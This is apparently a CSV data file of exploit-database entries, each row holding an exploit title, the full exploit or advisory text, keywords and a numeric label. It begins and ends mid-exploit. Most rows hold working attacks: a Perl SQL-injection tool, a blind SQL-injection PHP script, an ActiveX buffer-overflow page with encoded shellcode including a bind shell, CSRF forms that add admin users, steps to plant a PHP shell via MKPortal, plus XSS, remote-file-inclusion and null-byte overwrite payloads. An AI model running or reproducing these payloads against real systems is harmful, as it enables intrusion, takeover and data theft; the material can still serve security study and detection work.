=> $h0st,                                             PeerPort => '80',                                             Proto    => 'tcp',                                        ) or die ""[-] Can't connect to $h0st:80\n[?] $! \n\n"";     $socket->send($data);     if ($way == 1) {        while ((my $e = <$socket>)&&($stop != 1)) {            if ($e =~ /$regexp/) {                $gotcha = $1;                $stop = 1;            }        }    }    elsif ($way == 2) {        my $re = get_req($host.""/1337.php"");        if ($re =~ /st4rt/) {            $gotcha = 1;            $stop = 1;        }        else {            $gotcha = 0;            $stop = 0;        }    }    if ($stop == 1) {        return($gotcha);    }    else {        return(""Failed"");    }  }  sub get_req() {    $link = $_[0];    my $req = HTTP::Request->new(GET => $link);    my $ua = LWP::UserAgent->new();    $ua->timeout(4);    my $response = $ua->request($req);    return $response->content; }  sub cheek() {    my $host = $_[0];    if ($host =~ /http:\/\/(.*)/) {        return 1;    }    else {        return 0;    } }  sub get_input() {    my $host = $_[0];    $host =~ /http:\/\/(.*)/;    $s_host = $1;    $s_host =~ /([a-z.-]{1,30})\/(.*)/;    ($h0st,$path) = ($1,$2);    $path =~ s/(.*)/\/$1/;    $full_det = $h0st."" "".$path;    return $full_det; }  sub tag() {    my $string = $_[0];    $string =~ s/ /\$/g;    $string =~ s/\s/\*/g;    return($string); }  sub tag_encode() {    my $sql = $_[0];    $sql =~ s/ /\%20/g;    $sql =~ s/</\%3C/g;    $sql =~ s/>/\%3E/g;    $sql =~ s/""/\%22/g;    return($sql); }  sub banner {    print ""\n"".          ""  ---------------------------\n"".          ""     SQL Command Injection   \n"".          ""       via Cookie Bypass     \n"".      ""         Bloginator V1A      \n"".          ""     by FireShot & Osirys    \n"".          ""  ---------------------------\n\n""; }  sub help() {    my $error = $_[0];    if ($error == -1) {        &banner;        print ""\n[-] Input data failed ! \n"";    }    elsif ($error == -2) {        &banner;        print ""\n[-] Bad hostname address !\n"";    }    print ""[*] Usage : perl $0 http://hostname/cms_path\n\n"";    exit(0); }  [/EXPLOIT]  ############################################################################   # milw0rm.com [2009-03-19]",['articleCall.php?'],1
30555,"MKPortal 1.0/1.1 - 'admin.php' Authentication Bypass source: https://www.securityfocus.com/bid/25515/info  MKPortal is prone to an authentication-bypass vulnerability because it fails to restrict access to certain administrative functions.  Attackers can exploit this issue to gain unauthorized access to the application.  Versions prior to MKPortal 1.1.1 are vulnerable.   Start Macromedia Flash and create an swf file with this code:  var idg:Number = 9; var p13:Number = 1; var Salva:String = ""Save+Permissions""; getURL(""http://victim.com/mkportal/admin.php?ind=ad_perms&op=save_main"",  ""_self"", ""POST"");  Translate ""Save+Permissions"" in MKPortal language. Example: ""Salva+questi+permessi"" for italian sites.  Then upload the swf file to a webserver and create an html page like  this:  <html> <head> <title>Put a title here</title> </head> <body> <p>Put some text here<p> <iframe src=""http://yoursite.com/exploit.swf"" frameborder=""0"" height=""0""  width=""0""></iframe> </body> </html>  Now send the html page to MKPortal administrator. When admin opens the page all guests will be able to administrate  MKPortal.  So you can go here:  http://victim.com/mkportal/admin.php?ind=ad_contents&op=contents_new_php and paste a php shell or a backdoor. You can find your shell here:  http://victim.com/mkportal/cache/ppage_*.php where * is the ID of the page.  Translate ""page"" in MKPortal language. Example: ""pagina"" for italian sites.","[""'admin.php'"", 'admin']",1
12416,"PHP Quick Arcade 3.0.21 - Multiple Vulnerabilities PHP Quick Arcade 3.0.21 Multiple Vulnerabilites ----------------------------------------------------------- #Title: PHP-Quick-Arcade 3.0.21 Multiple Vulnerabilites #Vendor: http://quickarcade.jcink.com/ ----------------------------------------------------------- #AUTHOR: ITSecTeam #Email: Bug@ITSecTeam.com #Website: http://www.itsecteam.com #Forum : http://forum.ITSecTeam.com #Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability47.htm #Thanks: Pejvak,M3hr@n.s,r3dm0v3,am!rkh@n ----------------------------------------------------------- # POC 1 ----------------------------------------------------------- www.Site.com/Arcade.php Send Your Query With Cookie => phpqa_user_c phpqa_user_c= Sql Injection Can Use tamper data in mozila ----------------------------------------------------------- # POC 2 ----------------------------------------------------------- This Bug Worked With Register_Global = On www.Site.com/acpmoderate.php?id=Sql Injection ----------------------------------------------------------- # POC 3 ----------------------------------------------------------- Cross Site Scripting (XSS) www.Site.com/acpmoderate.php?serv=Xss Code",['acpmoderate.php?'],1
35291,Vanilla Forums 2.0.16 - 'Target' Cross-Site Scripting source: https://www.securityfocus.com/bid/46039/info  Vanilla Forums is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Vanilla Forums 2.0.16 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?p=/entry/signin&Target=javascript:alert(document.cookie)//http://,"[""'Target'""]",1
27129,"Easy Blog by JM LLC - Multiple Vulnerabilities Dear Offensive Security, I have discovered some vulnerabilities in Easy Blog, developed by JM LLC.  Best regards, Sp3ctrecore   ########## ADVISORY ##########   ============================================== Easy Blog by JM LLC - Multiple Vulnerabilities ==============================================  Software................: Easy Blog Software link...........: http://www.jmagness.com/download/Easy_Blog.zip Vendor..................: JM LLC Vendor homepage.........: http://www.jmagness.com  Exploit author..........: Sp3ctrecore Contact.................: sp3ctrecore[at]gmail[dot]com   -------- OVERVIEW --------  Easy Blog is affected by multiple vulnerabilities.   ------------------- DISCLOSURE TIMELINE -------------------  04/07/2013 -- Multiple vulnerabilities discovered and reported to the vendor. 19/07/2013 -- The vendor confirmed the vulnerabilities, but has no time to fix them. 24/07/2013 -- Public disclosure.   --------------- VULNERABILITIES ---------------  [01] SHELL UPLOAD  The image upload function in add.php allows unrestricted file upload. An attacker may upload a shell gaining unauthorized access to the system.   [02] MULTIPLE SQL INJECTIONS  I. add.php - filename parameter (POST request) An attacker may upload a file with a crafted name (e.g. ""file.txt',(select version()))-- -"") injecting SQL code. The content is readable in the homepage.  II. edit.php - filename parameter (POST request) An attacker may upload a file with a crafted name (e.g. ""file.txt',POST=(select version()) WHERE id=1-- -"") injecting SQL code. The content is readable in the homepage.   [03] MULTIPLE CROSS-SITE SCRIPTING  I.   add.php - title parameter (POST request): stored XSS. II.  add.php - keywords parameter (POST request): stored XSS. III. add.php - description parameter (POST request): stored XSS. IV.  add.php - slug parameter (POST request): reflected XSS.",['add.php '],1
36991,"eFront 3.6.15 - PHP Object Injection eFront 3.6.15 PHP Object Injection Vulnerability  [+] Author: Filippo Roncari [+] Target: eFront  [+] Version: 3.6.15 and probably lower [+] Vendor: www.efrontlearning.net [+] Accessibility: Remote [+] Severity: High [+] CVE: <requested> [+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf [+] Info: f.roncari@securenetwork.it    [+] Summary eFront is an open source Learning Management System (LMS) used to create and manage online training courses. From Wikipedia: “eFront is designed to assist with the creation of online learning communities while offering various opportunities for collaboration and interaction through an icon-based user interface. The platform offers tools for content creation, tests building, assignments management, reporting, internal messaging, forum, chat, surveys, calendar and others”.    [+] Vulnerability Details eFront 3.6.15 is prone to a PHP Object Injection vulnerability due to the unsafe use of unserialize() function. A potential attacker, authenticated as a Professor, could exploit this vulnerability by sending specially crafted requests to the web application containing malicious serialized input.   [+] Technical Details A PHP Object Injection issue affects the copy.php script, which handles the copying of content between lessons, and others probably exist, due to the frequent use of deserialization operations on non-sanitized user input.   	[!] File: libraries/includes/copy.php 	----------------------------- 	if ($_GET['transfered']) { 		$transferedNodesCheck = unserialize($_GET['transfered']);  	} 	$copiedTests = array(); 	$copiedUnits = array(); 	$map = array(); 	foreach ($nodeOrders as $value) { 			list($id, $parentContentId) = explode(""-"", $value); 			if (!in_array($id, $transferedNodesCheck)) { 	-----------------------------  The injection affects the ""transfered"" parameter.   [+] Proof of Concept (PoC)   	[!] HTTP Request 	----------------------------- 	GET /test/efront/www/professor.php?ctg=copy&from=8&node_orders=&transfered=[SERIALIZED_ARBITRARY_OBJECT]&mode&a jax=ajax&csrf_id=6ebb0b3aee60a1764e780e8494985a8e HTTP/1.1 	Host: localhost 	Proxy-Connection: keep-alive 	Accept: text/javascript, text/html, application/xml, text/xml, */* 	X-Prototype-Version: 1.7 	X-Requested-With: XMLHttpRequest 	Cookie: display_all_courses=1; setFormRowsHidden=0; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; SQLiteManager_currentLangue=2; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; professor_sidebar=hidden; professor_sidebarMode=automatic; parent_sid=6ebb0b3aee60a1764e780e8494985a8e 	-----------------------------  A common way to exploit this vulnerability is to find a PHP magic method that can be abused and inject a properly crafted arbitrary object in order to trigger it. Although a deeper analysis has not been performed, no useful PHP magic methods have been identified in order to exploit this specific vulnerability. Because the unmarshalled user input $transferedNodesCheck is exclusively used within an in_array() call, only __wakeup() and __destruct() methods could be abused to exploit the issue. However, none of those lends itself to the purpose. The vulnerability could still be abused in case of PHP vulnerable version (e.g., CVE-2014-8142) to create denial of service, leak memory and, under certain conditions, execute code.   [+] Disclaimer Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.",['copy.php '],1
4806,"Persits Software XUpload Control - 'AddFolder()' Remote Buffer Overflow <!--  written by e.b.  Persits Software XUpload Control AddFolder() Buffer Overflow Exploit Tested on Windows XP SP2(fully patched) English, IE6 and IE7  Thanks to h.d.m. and the Metasploit crew  --> <html>  <head>   <title>Persits Software XUpload Control AddFolder BoF  Exploit</title>   <script language=""JavaScript"" defer>     function Check() {            var buf = 'A';       while (buf.length <= 1387) buf = buf + 'A';   // win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe  Size=378 Encoder=Alpha2 http://metasploit.com  var shellcode1 =  unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49"" + ""%48%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%43"" + ""%58%30%42%31%50%42%41%6b%42%41%53%42%32%42%41%32"" + ""%41%41%30%41%41%58%50%38%42%42%75%48%69%6b%4c%4d"" + ""%38%63%74%75%50%33%30%67%70%4c%4b%73%75%57%4c%6e"" + ""%6b%63%4c%45%55%63%48%33%31%58%6f%6c%4b%70%4f%77"" + ""%68%6e%6b%73%6f%71%30%65%51%6a%4b%72%69%4e%6b%36"" + ""%54%4e%6b%45%51%4a%4e%46%51%6b%70%4f%69%4c%6c%6e"" + ""%64%59%50%73%44%53%37%58%41%7a%6a%54%4d%33%31%78"" + ""%42%48%6b%7a%54%77%4b%52%74%66%44%34%44%62%55%59"" + ""%75%6e%6b%41%4f%36%44%45%51%6a%4b%53%56%4c%4b%46"" + ""%6c%72%6b%4c%4b%53%6f%37%6c%63%31%6a%4b%4e%6b%75"" + ""%4c%6c%4b%54%41%48%6b%4d%59%51%4c%51%34%34%44%4a"" + ""%63%30%31%6f%30%62%44%4e%6b%71%50%54%70%4b%35%6b"" + ""%70%50%78%46%6c%6c%4b%63%70%44%4c%4c%4b%44%30%35"" + ""%4c%6e%4d%6c%4b%61%78%55%58%6a%4b%64%49%4e%6b%6b"" + ""%30%6c%70%57%70%57%70%47%70%4c%4b%70%68%47%4c%71"" + ""%4f%44%71%6b%46%33%50%66%36%4f%79%4c%38%6e%63%4f"" + ""%30%71%6b%30%50%41%78%58%70%6c%4a%53%34%51%4f%33"" + ""%58%4e%78%39%6e%6d%5a%46%6e%61%47%4b%4f%69%77%63"" + ""%53%45%6a%33%6c%72%57%30%69%50%6e%62%44%70%6f%73"" + ""%47%41%63%41%4c%50%73%42%59%31%63%50%74%65%35%70"" + ""%6d%54%73%65%62%33%6c%30%63%41%71%70%6c%53%53%66"" + ""%4e%31%75%74%38%70%65%77%70%43"");  // win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2  http://metasploit.com  var shellcode2 =  unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49"" + ""%49%49%49%49%49%49%49%49%49%49%37%49%51%5a%6a%43"" + ""%58%30%42%31%50%41%42%6b%41%41%53%41%32%41%41%32"" + ""%42%41%30%42%41%58%50%38%41%42%75%78%69%4b%4c%72"" + ""%4a%58%6b%52%6d%4a%48%4a%59%6b%4f%6b%4f%69%6f%41"" + ""%70%4e%6b%52%4c%74%64%41%34%6e%6b%37%35%55%6c%4c"" + ""%4b%71%6c%64%45%61%68%74%41%6a%4f%6e%6b%62%6f%32"" + ""%38%6c%4b%33%6f%37%50%55%51%78%6b%31%59%6c%4b%50"" + ""%34%6e%6b%46%61%68%6e%45%61%6f%30%6c%59%6c%6c%6b"" + ""%34%39%50%41%64%37%77%68%41%69%5a%56%6d%63%31%4b"" + ""%72%78%6b%6c%34%75%6b%56%34%31%34%57%58%54%35%6b"" + ""%55%6e%6b%33%6f%55%74%74%41%78%6b%41%76%4c%4b%46"" + ""%6c%62%6b%6e%6b%41%4f%35%4c%56%61%68%6b%66%63%36"" + ""%4c%6c%4b%6b%39%72%4c%44%64%57%6c%61%71%4f%33%47"" + ""%41%6b%6b%33%54%4c%4b%63%73%70%30%6c%4b%53%70%64"" + ""%4c%6c%4b%72%50%45%4c%4e%4d%6c%4b%37%30%75%58%73"" + ""%6e%42%48%4c%4e%52%6e%46%6e%58%6c%56%30%39%6f%58"" + ""%56%71%76%46%33%72%46%63%58%30%33%70%32%33%58%54"" + ""%37%52%53%45%62%51%4f%50%54%4b%4f%5a%70%33%58%6a"" + ""%6b%68%6d%59%6c%45%6b%46%30%49%6f%59%46%73%6f%4e"" + ""%69%58%65%73%56%4d%51%58%6d%36%68%64%42%72%75%72"" + ""%4a%67%72%59%6f%6e%30%72%48%4a%79%56%69%6b%45%6e"" + ""%4d%76%37%6b%4f%58%56%33%63%30%53%50%53%76%33%70"" + ""%53%33%73%53%63%37%33%56%33%6b%4f%5a%70%32%46%50"" + ""%68%35%41%71%4c%30%66%33%63%6c%49%6d%31%6a%35%70"" + ""%68%6e%44%35%4a%52%50%4b%77%71%47%4b%4f%4e%36%30"" + ""%6a%52%30%31%41%70%55%59%6f%6e%30%30%68%6c%64%4c"" + ""%6d%54%6e%79%79%31%47%59%6f%59%46%46%33%66%35%6b"" + ""%4f%58%50%63%58%4b%55%73%79%4c%46%41%59%63%67%4b"" + ""%4f%78%56%76%30%53%64%41%44%33%65%79%6f%4e%30%4e"" + ""%73%71%78%58%67%61%69%69%56%71%69%62%77%39%6f%6a"" + ""%76%51%45%49%6f%4e%30%51%76%53%5a%71%74%72%46%62"" + ""%48%30%63%30%6d%6c%49%5a%45%63%5a%62%70%76%39%31"" + ""%39%58%4c%4e%69%4d%37%53%5a%33%74%4e%69%4b%52%56"" + ""%51%4b%70%6c%33%6f%5a%49%6e%33%72%44%6d%6b%4e%37"" + ""%32%76%4c%6e%73%6c%4d%70%7a%76%58%6c%6b%4e%4b%4c"" + ""%6b%73%58%53%42%79%6e%6d%63%74%56%6b%4f%30%75%70"" + ""%44%4b%4f%79%46%53%6b%70%57%70%52%71%41%50%51%42"" + ""%71%41%7a%33%31%42%71%41%41%51%45%66%31%69%6f%5a"" + ""%70%50%68%6e%4d%5a%79%56%65%68%4e%33%63%39%6f%58"" + ""%56%63%5a%4b%4f%4b%4f%70%37%4b%4f%4a%70%4c%4b%61"" + ""%47%6b%4c%4d%53%6b%74%31%74%49%6f%59%46%70%52%59"" + ""%6f%4e%30%63%58%6c%30%6f%7a%57%74%61%4f%32%73%4b"" + ""%4f%68%56%39%6f%38%50%43"");   		var eip = unescape(""%2B%1C%E1%77""); //advapi32.dll Windows XP SP2 0x77E11C2B call esp  		var nop = unescape(""%90%90%90%90%90%90%90%90%90%90%90%90"");  		var m = buf + eip + nop + shellcode1;  		obj.AddFolder(m);     }         </script>   </head>  <body onload=""JavaScript: return Check();"">     <object id=""obj"" classid=""clsid:E87F6C8E-16C0-11D3-BEF7-009027438003"">      Unable to create object     </object>  </body> </html>  # milw0rm.com [2007-12-28]","[""'AddFolder()'""]",1
48446,"Sentrifugo CMS 3.2 - Persistent Cross-Site Scripting # Exploit Title: Sentrifugo CMS 3.2 - Persistent Cross-Site Scripting # Dork: N/A # Date: 2020-05-06 # Exploit Author: Vulnerability-Lab # Vendor: http://www.sentrifugo.com/ # Link: http://www.sentrifugo.com/download # Version: 3.2 # Category: Webapps # CVE: N/A  Document Title: =============== Sentrifugo v3.2 CMS - Persistent XSS Web Vulnerability   References (Source): ==================== https://www.vulnerability-lab.com/get_content.php?id=2229   Product & Service Introduction: =============================== http://www.sentrifugo.com/ http://www.sentrifugo.com/download   Affected Product(s): ==================== Sentrifugo Product: Sentrifugo v3.2 - CMS (Web-Application)   Vulnerability Disclosure Timeline: ================================== 2020-05-05: Public Disclosure (Vulnerability Laboratory)   Technical Details & Description: ================================ A persistent input validation web vulnerability has been discovered in the official Mahara v19.10.2 CMS web-application series. The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector to compromise browser to web-application requests from the application-side.  The persistent vulnerability is located in the `expense_name` parameters of the `/expenses/expenses/edit` module in the `index.php` file. Remote attackers with low privileges are able to inject own malicious persistent script code as expenses entry. The injected code can be used to attack the frontend or backend of the web-application. The request method to inject is POST and the attack vector is located on the application-side. Entries of expenses can be reviewed in the backend by higher privileged accounts as well.  Successful exploitation of the vulnerabilities results in session hijacking, persistent phishing attacks, persistent external redirects to malicious source and persistent manipulation of affected application modules.  Request Method(s): [+] POST  Vulnerable Module(s): [+] index.php/expenses/expenses/edit  Vulnerable Input(s): [+] Expenses Name  Vulnerable File(s): [+] index.php  Vulnerable Parameter(s): [+] expense_name  Affected Module(s): [+] index.php/expenses/expenses   Proof of Concept (PoC): ======================= The persistent web vulnerability can be exploited by low privileged web application user account with low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   PoC: Vulnerable Source <div id=""maincontentdiv"">	 <div id=""dialog-confirm"" style=""display:none;""> <div class=""newframe-div""> <div class=""new-form-ui height32""> <div class=""division""> <input type=""text"" maxlength=""12"" id=""number_value"" name=""number_value""></div> <span class=""errors"" id=""errors-contactnumber""></span></div></div></div>								 <div id=""empstatus-alert"" style=""display:none;""> <div class=""newframe-div""><div id=""empstatusmessage""></div></div></div> <div id=""empleaves-alert"" style=""display:none;""> <div class=""newframe-div""><div id=""empleavesmessage""></div></div></div>	   --- PoC Session Logs [POST] --- (Expenses Inject) http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit Host: sentrifugo.localhost:8080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded Content-Length: 352 Origin: http://sentrifugo.localhost:8080 Connection: keep-alive Referer: http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit Cookie: PHPSESSID=h67jk6dashpvgn5n3buc6uia87; _ga=GA1.2.788961556.1587849443; _gid=GA1.2.1158360779.1587849443 id=&limit=&offset=&parameter=all&currencyid=1&file_original_names=&file_new_names=&last_inserted_receipts=&receiptId=&expense_Id=& expense_name=<img src=""evil.source"" onload=alert(document.domain)>&category_id=&project_id=&expense_date=&expense_currency_id=2& expense_amount=&cal_amount=0&is_from_advance=&expense_payment_id=&expense_payment_ref_no=&trip_id=&description=&post_receipt_ids=&submit=Save - POST: HTTP/1.1 200 OK Server: Apache/2.2.22 (Ubuntu) X-Powered-By: PHP/5.3.10-1ubuntu3.10 Vary: Accept-Encoding Content-Encoding: gzip Content-Length: 19284 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html   Reference(s): http://sentrifugo.localhost:8080/index.php http://sentrifugo.localhost:8080/index.php/expenses http://sentrifugo.localhost:8080/index.php/expenses/expenses/ http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit   Credits & Authors: ================== Vulnerability-Lab - https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab Benjamin Kunz Mejri - https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.   --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com",['index.php`'],1
38645,"NXFilter 3.0.3 - Cross-Site Request Forgery [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NXFILTER-CSRF.txt   Vendor: ================================ www.nxfilter.org/p2/   Product: ================================ NXFilter v3.0.3   Vulnerability Type: ================================= Cross site request forgery - CSRF   CVE Reference: ============== N/A   Vulnerability Details: ===================== No CSRF protections exist allowing us to make malicious HTTP requests on behalf of our victim. The Server will then happily process any of the following actions if our victim clicks our infected linx or visits our malicious website while currently logged in to the vulnerable application.  1) ""add arbitrary users"" 2) ""add or change SMTP settings"" 3) ""add arbitrary redirect domains"" 4) ""add arbitrary zone transfers"" 5) ""delete zone transfer domains""   Exploit code(s): ===============  <!DOCTYPE> <html> <head> <title></title>  <body onLoad=""doit()"">  <script> function doit(){  var e=document.getElementById('HELL')  e.submit() } </script>    1) CSRF add arbitrary users  <form id=""HELL"" action=""http://localhost/user,user.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""name"" value=""punksnotdead""> <input type=""text"" name=""description"" value=""<script>alert(666)</script>"">  <---- and some persistent XSS! </form>   2) CSRF add or change SMTP notification alerts  <form id=""HELL"" action=""http://localhost/config,alert.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""update"" > <input type=""text"" name=""admin_email"" value=""ghostofsin@abyss.com""> <input type=""text"" name=""smtp_host"" value=""6.6.6.0""> <input type=""text"" name=""smtp_port"" value=""25""> <input type=""text"" name=""smtp_user"" value=""hyp3rlinx""> <input type=""text"" name=""smtp_passwd"" value=""abc123""> <input type=""text"" name=""period"" value=""0""> <input type=""text"" name=""token"" value=""""> </form>    3) CSRF add arbitrary redirect domain  <form id=""HELL"" action=""http://localhost/config,redirection.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""src"" value=""hyp3rlinx.altervista.org""> <input type=""text"" name=""dst"" value=""6.6.6.0""> </form>    4) CSRF add arbitrary zone transfers  <form id=""HELL"" action=""http://localhost/config,zone_transfer.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""domain"" value=""hyp3rlinx.altervista.org""> <input type=""text"" name=""ip"" value=""6.6.6.0""> </form>    5) CSRF delete zone transfer domains  http://localhost/config,zone_transfer.jsp?action_flag=delete&id=1   Disclosure Timeline: ====================================== Vendor Notification: October 18, 2015 November 5, 2015  : Public Disclosure   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Description: ==========================================================  Request Method(s):              [+] GET / POST   Vulnerable Product:             [+] NXFilter v3.0.3   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",['CSRF'],0
3249,WebBuilder 2.0 - 'StageLoader.php' Remote File Inclusion -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= WebBuilder <= 2.0 Remote File Include Vulnerability * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Discovered by GolD_M(Mahmnood_ali) & &  Contact: HackEr_@W.Cn * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= URL: * http://oss.backendmedia.com/snapshots/webbuilder2-2006-08-18.zip * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= V.CODE: In : /library/StageLoader.php * require_once($GLOBALS['core']['module_path'].'/module_common.php'); * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Exploit: * http://victim.com/[path]/library/StageLoader.php?GLOBALS[core][module_path]=Evil.txt?  * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Thanx : Tryag.Com & DwRaT.Com & Asb-May.Net & Milw0rm.com & H4cky0u.Com & Google.Com     * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=  # milw0rm.com [2007-02-01],"[""'StageLoader.php'""]",1
7928,"Synactis All_IN_THE_BOX ActiveX 3.0 - Null Byte File Overwrite Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-006  http://www.dsecrg.com/pages/vul/show.php?id=62   Application:                    Synactis All_IN_THE_BOX ActiveX Versions Affected:              3 Vendor URL:                     http://synactis.com Bugs:                           Null byte File overwriting Exploits:                       YES Reported:                       15.01.2009 Vendor response:                NONE Second Report:                  22.01.2009 Vendor response:                NONE Date of Public Advisory:        30.01.2009 Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)   Description *********** Synactis All_IN_THE_BOX ActiveX  Control  (ALL_IN_THE_BOX.OCX) can be used to owervrite any any file in target system. Vulnerable method is ""SaveDoc()""   Details *******  By default when saving file All_IN_THE_BOX ActiveX control  attend extension to filename variable in ""SaveDoc()"" method. For example if you enter filename ""boot.ini"" in ""SaveDoc()"" method then control will create file boot.ini.box. But by attending a null byte to filename attacker can owervrite any file in OS (see example for owervriting boot.ini)    Class AllBox GUID: {B5576893-F948-4E0F-9BE1-A37CB56D66FF} Number of Interfaces: 1 Default Interface: IAllBox RegKey Safe for Script: False RegkeySafe for Init: False KillBitSet: False    Example: *******  <html> Test Exploit page <object classid='clsid:B5576893-F948-4E0F-9BE1-A37CB56D66FF' id='sh2kerr' ></object> <script language='vbscript'>  targetFile = ""C:\PROGRA~1\Synactis\ALLIN-~1\ALL_IN~1.OCX"" prototype  = ""Sub SaveDoc ( ByVal aFileName As String )"" memberName = ""SaveDoc"" progid     = ""All_In_The_Box.AllBox"" argCount   = 1 arg1=""C:\boot.ini""+unescape(""%00"") sh2kerr.SaveDoc arg1 </script> </html>    Fix Information ***************  No patches available. We did not get any response from vendor for 2 weeks.     About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.   Contact:        research [at] dsec [dot] ru                 http://www.dsecrg.com                 http://www.dsec.ru  # milw0rm.com [2009-01-30]",['All_IN_THE_BOX'],0
3948,Libstats 1.0.3 - 'template_csv.php' Remote File Inclusion #Libstats 1.0.3 <=  Remote File Inclusion Vulnerability # #Vuln Code ############################################################################################## # #ERROR1:template_csv.php # #include $rInfo['content'];   <<< RFI CODE # # #BUG1: # #Example1:http://site.com/path/template_csv.php?rInfo[content]=[[Sh3LL Script]] # #Script Download ############################################################################################## # #http://www.wendt.wisc.edu/projects/systems/libstats/releases/libstats-1.0.3.zip # ############################################################################################## # #Cyber-Security <> Cyber-warrior.org # ##############################################################################################  # milw0rm.com [2007-05-18],"[""'template_csv.php'""]",1
45456,Joomla! Component Auction Factory 4.5.5 - 'filter_order' SQL Injection # Exploit Title: Joomla! Component Auction Factory 4.5.5 - 'filter_order' SQL Injection # Exploit Author: Ihsan Sencan # Dork: N/A # Date: 2018-09-24 # Vendor Homepage: https://thephpfactory.com/ # Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/auction/auction-factory/ # Version: 4.5.5 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:   # 1) # http://localhost/[PATH]/index.php?option=com_auctionfactory&task=listauctions&filter_order_Dir=[SQL]&filter_order=[SQL]  %2c%45%58%54%52%41%43%54%56%41%4c%55%45%28%36%36%2c%43%4f%4e%43%41%54%28%30%78%35%63%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%36%36%3d%36%36%2c%31%29%29%29%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%29%29,"[""'filter_order'""]",1
7683,"Goople 1.8.2 - 'FrontPage.php' Blind SQL Injection #--+++=========================================================+++--# #--+++====== Goople <= 1.8.2 Blind SQL Injection Exploit ======+++--# #--+++=========================================================+++--#  #!/usr/bin/php <?  function usage () { 	echo 		""\n[+] Goople <= 1.8.2 Blind SQL Injection Exploit"". 		""\n[+] Author: darkjoker"". 		""\n[+] Site  : http://darkjoker.net23.net"". 		""\n[+] Usage : php xpl.php <hostname> <path> [key]"". 		""\n[+] Ex.   : php xpl.php localhost /goople abcdefghijklmnopqrstuvwxyz"". 		""\n[+] Note  : Have fun ^^\n\n""; 	exit (); }  function check ($hostname, $path, $field, $pos, $char) { 	$char = ord ($char); 	$fp = fsockopen ($hostname, 80); 	$usr = ""username=1' OR IF((ASCII(SUBSTRING((SELECT {$field} FROM GoopleCMS_users_ WHERE id =1),{$pos},1))={$char})"". 	       "",BENCHMARK(200000000,CHAR(0)),0) OR '1' = '2""; 	$usr = str_replace (""'"", ""%27"", $usr); 	$usr = str_replace ("" "", ""%20"", $usr); 	